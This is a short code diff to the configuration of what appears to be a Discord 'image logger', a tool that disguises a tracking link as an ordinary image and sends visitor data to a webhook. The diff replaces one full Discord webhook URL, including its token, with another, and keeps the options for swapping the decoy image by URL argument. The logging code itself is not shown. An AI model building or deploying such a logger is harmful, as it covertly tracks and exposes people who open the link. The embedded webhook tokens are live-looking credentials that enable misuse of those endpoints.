@@ -12,7 +12,7 @@ __author__ = "Leon"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1373051167625445386/tLDCSUbW1d3AG7x7iRAkWW1imLcl6e93QoUJEThtERvLZiK2HeM01keDnEAaqKHaU6Jw",
+    "webhook": "https://discord.com/api/webhooks/1373745304704385045/rYi32obpwlazFSvw11UF509JeYlTEyUTxTreaO5qLqJH6EmhkXJnYts1OlCxtaSOQQ1D",
     "image": "https://shop.renolit.com/out/pictures/master/product/1/Grau_7155_Glatt-2_Grey_7155_Smooth-2_02.11.71.000047---809700_OS.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
